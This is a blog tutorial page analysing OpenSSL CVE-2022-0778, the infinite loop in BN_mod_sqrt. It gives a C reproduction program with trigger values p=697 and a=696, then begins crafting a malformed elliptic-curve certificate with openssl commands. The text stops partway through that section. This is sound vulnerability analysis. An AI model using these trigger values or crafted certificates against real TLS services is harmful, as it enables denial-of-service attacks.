<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>OpenSSL CVE-2022-0778 Vulnerability Recurrence and Illegal Certificate Construction - SoByte</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6356451834813761" crossorigin="anonymous"></script>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-E8GRRGBTEZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-E8GRRGBTEZ');
</script>


<meta name="author" content="" /><meta name="description" content="This paper introduces the CVE-2022 0778 vulnerability and its recurrence, and carefully constructs a certificate with an illegal elliptic curve parameter that can trigger the vulnerability." /><meta name="keywords" content="Openssl, CVE-2022-0778, Vulnerability" />






<meta name="generator" content="Hugo 0.92.2 with theme even" />


<link rel="canonical" href="https://www.sobyte.net/post/2022-03/openssl-cve-2022-0778/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="OpenSSL CVE-2022-0778 Vulnerability Recurrence and Illegal Certificate Construction" />
<meta property="og:description" content="This paper introduces the CVE-2022 0778 vulnerability and its recurrence, and carefully constructs a certificate with an illegal elliptic curve parameter that can trigger the vulnerability." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.sobyte.net/post/2022-03/openssl-cve-2022-0778/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-03-24T10:02:26+08:00" />
<meta property="article:modified_time" content="2022-03-24T10:02:26+08:00" />

<meta itemprop="name" content="OpenSSL CVE-2022-0778 Vulnerability Recurrence and Illegal Certificate Construction">
<meta itemprop="description" content="This paper introduces the CVE-2022 0778 vulnerability and its recurrence, and carefully constructs a certificate with an illegal elliptic curve parameter that can trigger the vulnerability."><meta itemprop="datePublished" content="2022-03-24T10:02:26+08:00" />
<meta itemprop="dateModified" content="2022-03-24T10:02:26+08:00" />
<meta itemprop="wordCount" content="2542">
<meta itemprop="keywords" content="openssl," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="OpenSSL CVE-2022-0778 Vulnerability Recurrence and Illegal Certificate Construction"/>
<meta name="twitter:description" content="This paper introduces the CVE-2022 0778 vulnerability and its recurrence, and carefully constructs a certificate with an illegal elliptic curve parameter that can trigger the vulnerability."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">SoByte</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a><a href="/ukraine/">
        <li class="mobile-menu-item">UKRAINE</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">SoByte</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/categories/">Categories</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">About</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/ukraine/">UKRAINE</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">OpenSSL CVE-2022-0778 Vulnerability Recurrence and Illegal Certificate Construction</h1>

      <div class="post-meta">
        <span class="post-time"> 2022-03-24 10:02:26 </span>
        <div class="post-category">
            <a href="/categories/tutorials/"> tutorials </a>
            </div>
          <span class="more-meta"> 2542 words </span>
          <span class="more-meta"> 12 mins read </span>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#vulnerability-description">Vulnerability Description</a></li>
        <li><a href="#function-analysis">Function Analysis</a></li>
        <li><a href="#reproduction-problem">Reproduction problem</a></li>
        <li><a href="#constructing-an-illegal-certificate">Constructing an Illegal Certificate</a>
          <ul>
            <li><a href="#create-a-normal-certificate-with-explicit-curve-parameters">Create a normal certificate with explicit curve parameters</a></li>
            <li><a href="#constructing-illegal-certificates">Constructing illegal certificates</a></li>
            <li><a href="#testing-with-an-illegal-certificate">Testing with an illegal certificate</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <h2 id="vulnerability-description">Vulnerability Description</h2>
<p>The <a href="https://www.cve.org/CVERecord?id=CVE-2022-0778">vulnerability</a> is in the <code>BN_mod_sqrt()</code> interface function, which is used to compute the square root of a modulus and expects that the argument p should be a prime number, but there is no check within the function, which leads to a possible infinite loop internally. This function is used when parsing certificates of the following format.</p>
<ul>
<li>when the certificate contains an elliptic curve public key in compressed format</li>
<li>certificate with explicit elliptic curve parameters whose base point is encoded in compressed format</li>
</ul>
<p>In short, this function is called when the certificate is parsed and the point coordinates need to be decompressed. So an external party can trigger an infinite loop by carefully constructing a certificate with an illegal explicit curve parameter, thus causing a DoS denial of service attack.</p>
<p><a href="https://github.com/openssl/openssl/commit/3118eb64934499d93db3230748a452351d1d9a65">Official patch commit</a></p>
<h2 id="function-analysis">Function Analysis</h2>
<p>Let&rsquo;s briefly go through the implementation of this function. The function signature is as follows, a is the operand and p is the modulus.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">BIGNUM *BN_mod_sqrt<span class="o">(</span>BIGNUM *in, const BIGNUM *a, const BIGNUM *p, BN_CTX *ctx<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>First, a simple check is done on p. The two cases where p is even and 1, which are obviously not prime numbers, are reported directly as errors, and the case where p is 2 is handled specially.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-h" data-lang="h"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_is_odd</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">||</span> <span class="n">BN_abs_is_word</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">BN_abs_is_word</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// ...
</span><span class="c1"></span>    <span class="p">}</span>
    <span class="n">BNerr</span><span class="p">(</span><span class="n">BN_F_BN_MOD_SQRT</span><span class="p">,</span> <span class="n">BN_R_P_IS_NOT_PRIME</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Next, the special case where a is 0 or 1 is handled specially.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-h" data-lang="h"><span class="k">if</span> <span class="p">(</span><span class="n">BN_is_zero</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">||</span> <span class="n">BN_is_one</span><span class="p">(</span><span class="n">a</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// ...
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Then calculate <code>A := a mod p</code>, which is to calculate the non-negative remainder.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="k">if</span> <span class="o">(</span>!BN_nnmod<span class="o">(</span>A, a, p, ctx<span class="o">))</span>
</code></pre></td></tr></table>
</div>
</div><p>The following lines literally count several consecutive zeros from the first digit of p. In fact, |p| - 1 is expressed in the following format: <code>|p| - 1 == 2^e * q</code>, which is expressed as an odd multiple of a power of 2, where q is an odd number. For example, if p is 49, which means binary is 110001, then e is 4 and q is 3, <code>49 - 1 == 2^4 * 3</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="nv">e</span> <span class="o">=</span> 1<span class="p">;</span>
<span class="k">while</span> <span class="o">(</span>!BN_is_bit_set<span class="o">(</span>p, e<span class="o">))</span>
    e++<span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>The next special treatment is for the simple case where e equals 1 or 2, which we skip because it does not go to an infinite loop.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">if (e == 1) {
}
if (e == 2) {
}
</code></pre></td></tr></table>
</div>
</div><p>For the case e &gt; 2, it is necessary to compute it honestly using the Tonelli/Shanks algorithm. First you need to find a y that is not a square number and <code>0 &lt; y &lt; |p|</code> , because it is not the point we skip it.</p>
<p>Next, the value of q is computed by shifting p right by e bits to get q.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_copy</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">p</span><span class="p">))</span>
   <span class="c1">// ...
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_rshift</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">e</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p><code>y := (y ^ q) mod p</code> , because y is a non-square number, so calculating the qth power gives a value of order 2^e. (Don&rsquo;t ask me why, the comment says so ðŸ¤·)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_exp</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p>The next step is to calculate <code>x := a^((q-1)/2)</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">if (!BN_rshift1(t, q))
    
if (!BN_mod_exp(x, A, t, p, ctx))
</code></pre></td></tr></table>
</div>
</div><p>The following two calculations <code>b := a*x^2 (= a^q)</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_sqr</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>
    
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_mul</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p>Then calculate <code>x := a*x (= a^((q+1)/2))</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">if (!BN_mod_mul(x, x, A, p, ctx))
</code></pre></td></tr></table>
</div>
</div><p>Finally, we are going to enter the loop structure that we are most concerned about. Here there are two levels of loops, and the dead loop occurs in the inner loop. Let&rsquo;s look at the difference between the code before and after the modification. The following is the problematic loop code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// before
</span><span class="c1"></span><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_sqr</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>
    <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_is_one</span><span class="p">(</span><span class="n">t</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">i</span><span class="o">++</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ERR_raise</span><span class="p">(</span><span class="n">ERR_LIB_BN</span><span class="p">,</span> <span class="n">BN_R_NOT_A_SQUARE</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_mul</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>
        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>At first glance there seems to be no difference, just a while loop changed to a for loop. The difference is very subtle, there are two main points.</p>
<ul>
<li>The former is to determine whether t is 1 to end normally and <code>i == e</code> to end abnormally within the loop, while the latter is to determine whether <code>i &lt; e</code> to end abnormally and t is 1 to end normally within the loop;</li>
<li>Another very important difference is that the former case of i being 1 is not in the loop</li>
</ul>
<p>The problem arises from this subtle difference. Consider a situation where e is less than or equal to i at the beginning of the following inner loop (e=1, for example), then the <code>i == e</code> condition will never be satisfied. If then makes t never equal to 1, then it will enter a dead loop.</p>
<p>For the first time into the outer loop, e is definitely greater than 2 and will not enter the dead loop, but don&rsquo;t forget that i is assigned to e at the end of the outer loop, as follows.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-h" data-lang="h"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
       <span class="c1">// ...
</span><span class="c1"></span>    	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">e</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
           <span class="c1">// ...
</span><span class="c1"></span>       <span class="p">}</span>
       <span class="cm">/* t := y^2^(e - i - 1) */</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_copy</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
           <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
       <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="n">e</span> <span class="o">-</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_sqr</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>
               <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
       <span class="p">}</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_mul</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>  <span class="c1">// y := t^2 = y^2^(e-i)
</span><span class="c1"></span>           <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_mul</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>  <span class="c1">// x = x*t
</span><span class="c1"></span>           <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">BN_mod_mul</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">))</span>  <span class="c1">// b = y^2^(e-i) y is the original
</span><span class="c1"></span>           <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
       <span class="n">e</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
   <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>So combining these conditions, one can try to construct attacks that can enter the dead loop by</p>
<ul>
<li>Pick suitable a and p such that <code>b^2=1(mod p)</code> , where b is computed from a, so that the outer loop does not enter the while inner loop on the first iteration, and the value of i is 1. So e becomes 1 on the second iteration of the outer loop</li>
<li>When the outer loop does the second iteration, just make <code>t ! = 1 (mod p)</code> is always satisfied, it will enter the dead loop</li>
</ul>
<p><strong>Note</strong> : The first condition also happens when p is a normal prime, but if p is a composite number then the second condition will also be satisfied.</p>
<h2 id="reproduction-problem">Reproduction problem</h2>
<p>To reproduce the problem, it is really a matter of picking the right parameters a and p so that the above conditions hold. p needs to be chosen in such a way that it passes some checks in front of the function, it cannot be too obviously a composite number, it must be odd, and e needs to be greater than 2, i.e. the binary representation of p must be of the form <code>...001</code>. In addition the selection of a needs to satisfy <code>a == -1 (mod p)</code> and <code>b == -1 (mod p)</code> so that after the first outer iteration e is set to 1, making the second entry into the outer iteration enter a dead loop.</p>
<p>Determining a and p requires some knowledge of mathematics and an understanding of the implementation of the Tonelli/Shanks algorithm. I&rsquo;m not a math major and I never studied number theory, so it takes some time to fully understand the math. The good thing is that drago-96 colleague helped us to do this, and he finally chose the combination p=697, a=696. If you are interested, you can read the mathematical description [^3].</p>
<p>With a and p, it is then possible to write a simple test program to reproduce the problem</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-h" data-lang="h"><span class="cp">#include</span> <span class="cpf">&lt;openssl/bn.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">BN_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
    <span class="n">ctx</span> <span class="o">=</span> <span class="n">BN_CTX_new</span><span class="p">();</span>
    <span class="n">BIGNUM</span> <span class="o">*</span><span class="n">res</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
    <span class="n">BN_CTX_start</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">BN_CTX_get</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">BN_CTX_get</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">BN_CTX_get</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>

    <span class="n">BN_dec2bn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p</span><span class="p">,</span> <span class="s">&#34;697&#34;</span><span class="p">);</span>
    <span class="n">BN_dec2bn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a</span><span class="p">,</span> <span class="s">&#34;696&#34;</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;p = %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BN_bn2dec</span><span class="p">(</span><span class="n">p</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;a = %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BN_bn2dec</span><span class="p">(</span><span class="n">a</span><span class="p">));</span>

    <span class="n">BIGNUM</span><span class="o">*</span> <span class="n">check</span> <span class="o">=</span> <span class="n">BN_mod_sqrt</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctx</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BN_bn2dec</span><span class="p">(</span><span class="n">res</span><span class="p">));</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>For the code before the fix, the program will enter a dead loop after execution</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">$ ./sqrt
p = 697
a = 696
</code></pre></td></tr></table>
</div>
</div><p>And the modification can end normally.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-h" data-lang="h"><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">sqrt</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">697</span>
<span class="n">a</span> <span class="o">=</span> <span class="mi">696</span>
<span class="mi">0</span>
<span class="err">$</span> 
</code></pre></td></tr></table>
</div>
</div><h2 id="constructing-an-illegal-certificate">Constructing an Illegal Certificate</h2>
<p>Next we try to construct an illegal certificate so that the certificate has an explicit elliptic curve parameter and the base point is encoded in compressed format. Then we modify the curve parameter in the certificate to the value we want.</p>
<h3 id="create-a-normal-certificate-with-explicit-curve-parameters">Create a normal certificate with explicit curve parameters</h3>
<p>First we need to create an ec key, because we want the certificate to contain explicit curve parameters, so we also choose to generate the key with explicit parameters</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">$ openssl ecparam -out ec.key -name prime256v1 -genkey -noout -param_enc explicit -conv_form compressed
</code></pre></td></tr></table>
</div>
</div><p>Next, for convenience, we directly self-issue a certificate. Here the output format is set to DER also to facilitate us to modify the ASN1 structure later.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ openssl req -new -x509 -key ec.key -out cert.der -outform DER -days <span class="m">360</span> -subj <span class="s2">&#34;/CN=TEST/&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>Confirm the certificate information, which contains the curve parameter information.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
